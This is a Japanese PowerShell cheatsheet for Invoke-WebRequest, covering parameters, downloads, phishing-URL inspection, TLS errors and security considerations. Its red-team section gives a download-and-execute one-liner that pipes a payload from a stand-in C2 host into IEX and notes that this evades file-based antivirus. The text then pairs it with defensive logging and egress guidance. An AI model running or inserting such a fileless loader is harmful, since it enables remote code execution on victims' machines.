---
tags:
  - 'Invoke-WebRequest'
  - 'powershell'
  - 'cheatsheet'
title: 'Invoke-WebRequest - Webページからコンテンツを取得する'
summary: 'WebページやWeb APIにHTTP/HTTPSリクエストを送信し、応答を詳細なオブジェクトとして返します。'
related:
  - 'Invoke-RestMethod'
  - 'curl'
  - 'wget'
---

# `Invoke-WebRequest` - Webページからコンテンツを取得する

## 概要

`Invoke-WebRequest` コマンドレットは、WebページやWebサービスに対してHTTP、HTTPS、FTPリクエストを送信するための基本的なコマンドレットです。最大の特徴は、応答を生のテキストだけでなく、解析されたHTMLドキュメントオブジェクト (`ParsedHtml`)、ヘッダー、ステータスコード、リンク、画像など、豊富な情報を含む `WebResponseObject`として返す点です。

Webサイトのスクレイピングや、APIとの詳細な対話、ファイルのダウンロードなどに広く利用されます。

このコマンドレットには、`iwr`, `curl`, `wget` という便利なエイリアスがデフォルトで設定されています。

## 類似コマンドレット/コマンドとの差異

| 類似コマンドレット/コマンド | 差異 / 使い分けのポイント |
| :--- | :--- |
| ⭐ **`Invoke-RestMethod`** | `Invoke-RestMethod` はAPIとの対話に特化しており、応答ボディ (JSON/XML) を自動的に解析して**PowerShellオブジェクトのみ**を返します。`Invoke-WebRequest` は、ヘッダーやステータスコードを含む**完全な応答オブジェクト**を返すため、より詳細なHTTPレスポンスの分析が必要です。 |
| **`curl` / `wget` (Linux)** | これらのツールは主にテキストベースで動作します。`Invoke-WebRequest` は結果を**オブジェクト**として返すため、`$response.Links.href` のように特定の要素にプログラム的にアクセスするのが非常に簡単です。 |

## よく連携されるコマンドレット

### シナリオ例: Webページから全てのリンクを抽出する (インフラ構築・運用視点)

* **目的**: 指定したWebページに含まれる全てのハイパーリンク (`<a>` タグの `href` 属性) を抽出し、リストアップする。
* **連携コマンドレット**: `Select-Object`
* **解説**: `Invoke-WebRequest` でWebページを取得すると、その応答オブジェクトの `Links` プロパティには、ページ内の全てのリンクがコレクションとして格納されています。`Select-Object -ExpandProperty` を使ってこのプロパティを展開し、`href` 属性をリスト表示します。
* **コマンド例**:

    ```powershell
    # PowerShellの公式ブログから全てのリンクを取得
    $response = Invoke-WebRequest -Uri "[https://devblogs.microsoft.com/powershell/](https://devblogs.microsoft.com/powershell/)"
    $response.Links.href
    ```

## パラメータ説明

| パラメータ | 型 | 説明 |
| :--- | :--- | :--- |
| ⭐ **`-Uri`** | `Uri` | リクエストを送信するURIを指定します。 |
| ⭐ **`-Method`** | `String` | 使用するHTTPメソッドを指定します (`GET`, `POST`, `PUT`, `DELETE`など)。デフォルトは `GET` です。 |
| ⭐ **`-Body`** | `Object` | `POST` や `PUT` リクエストで送信するデータを指定します。 |
| **`-ContentType`** | `String` | `-Body` のコンテンツタイプを指定します。 |
| **`-Headers`** | `IDictionary` | APIキーやカスタムユーザーエージェントなど、HTTPヘッダーをハッシュテーブル形式で指定します。 |
| ⭐ **`-OutFile`** | `String` | 応答ボディをダウンロードし、指定したファイルパスに保存します。 |
| **`-SessionVariable`** | `String` | セッションオブジェクトを格納する変数を指定します。後続のリクエストで同じセッションを再利用できます。 |
| **`-UseBasicParsing`** | `SwitchParameter` | Internet Explorerエンジンへの依存をなくし、基本的な解析のみを行います。IEがインストールされていない環境（Server Coreなど）で必須です。 |

## よく使われる組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: Webサイトからインストーラー (`.msi`) をダウンロードする。
* **組み合わせ**: `-Uri <URL> -OutFile <FilePath>`
* **解説**: `-Uri` でダウンロードするファイルのURLを指定し、`-OutFile` で保存先のパスを指定するだけで、簡単にファイルをダウンロードできます。
* **例**:

    ```powershell
    # 7-Zipのインストーラーをダウンロード
    Invoke-WebRequest -Uri "[https://www.7-zip.org/a/7z1900-x64.exe](https://www.7-zip.org/a/7z1900-x64.exe)" -OutFile "C:\Temp\7z.exe"
    ```

### 2. ブルーチーム視点

* **タスク**: フィッシングサイトの疑いがあるURLのヘッダー情報とコンテンツを、実行せずに安全に調査する。
* **組み合わせ**: `Invoke-WebRequest <URL>`
* **解説**: ブラウザで直接開くと危険なURLに対して `Invoke-WebRequest` を実行します。返ってきたオブジェクトの `StatusCode` (リダイレクトされていないか)、`Headers` (サーバーの種類など)、`Content` (生のHTML) を分析し、サイトの危険性を評価します。
* **例**:

    ```powershell
    # 不審なURLの応答を調査
    $response = Invoke-WebRequest -Uri "[http://suspicious-site.example.com](http://suspicious-site.example.com)"
    $response.StatusCode
    $response.Headers
    ```

### 3. レッドチーム視点

* **タスク**: **ファイルレス攻撃**。外部のWebサーバーからPowerShellペイロードをダウンロードし、直接メモリ上で実行する。
* **組み合わせ**: `IEX (Invoke-WebRequest ...).Content`
* **解説**: **PowerShellベースの攻撃における中核的なコマンドレット**。`Invoke-WebRequest` で取得した応答オブジェクトの `Content` プロパティ（ペイロードスクリプトの文字列）を、`Invoke-Expression` (エイリアス: `IEX`) に渡して直接実行します。これにより、ペイロードをディスクに書き込むことなく実行でき、ファイルベースのアンチウイルススキャンを回避します。
* **例**:

    ```powershell
    # C2サーバーからペイロードをダウンロードしてメモリ上で実行
    IEX (Invoke-WebRequest -Uri [http://attacker-c2.com/payload.ps1](http://attacker-c2.com/payload.ps1) -UseBasicParsing).Content
    ```

## エラーメッセージとトラブルシューティング

### よくあるエラーメッセージ

1. **エラーメッセージ**: `Invoke-WebRequest: The request was aborted: Could not create SSL/TLS secure channel.`
    * **考えられる原因**: 接続先のサーバーが、現在のPowerShellセッションでサポートされていない、より新しいTLSバージョンを要求しています。
    * **解決策**: スクリプトの冒頭で、より新しいTLSバージョンを有効にします。

      ```powershell
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      ```

## セキュリティに関する考慮事項

### 悪用事例

* **ファイルレス攻撃のダウンローダー**: レッドチームのシナリオで述べた通り、`Invoke-WebRequest` は攻撃者が外部から悪意のあるスクリプトやバイナリをダウンロードするための最も一般的な手段です。
* **データ窃取**: `POST` メソッドと組み合わせて、収集したデータをWebサーバーにアップロードするためにも利用されます。

### LOLBASにおける利用例

* **機能**: **ダウンロード (Download)**, **C2通信 (Command and Control)**, **データ窃-
** (Data Exfiltration)**
* **解説**: `Invoke-WebRequest` は PowerShell の標準機能であり、攻撃者が追加のツールをインストールすることなく、ネットワーク通信を行うための極めて重要な「環境寄生型」のツールです。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: ネットワークの出口（Egress）フィルタリングを強化し、プロキシやファイアウォールで、信頼できない宛先へのHTTP/HTTPS通信をブロックする。
* **Detection (検知)**: **PowerShellのスクリプトブロックロギング (イベントID 4104) を有効化する**ことが極めて重要です。これにより、`Invoke-WebRequest` の実行とその引数（接続先URIなど）、特に `Invoke-Expression` と組み合わせて使われるケースを記録・監視できます。`powershell.exe` プロセスからの不審なネットワーク接続をEDRやネットワーク監視ツールで厳重に監視します。

## 注意点・補足

* **`-UseBasicParsing`**: PowerShell 5.1以前の環境や、Internet ExplorerがインストールされていないWindows Server Coreのような環境で `Invoke-WebRequest` を使用する場合、`-UseBasicParsing` スイッチが必須になることがあります。このスイッチを付けると、HTMLのDOM解析は行われなくなります。

---
[PowerShellインデックスに戻る](../../powershell_index.md)
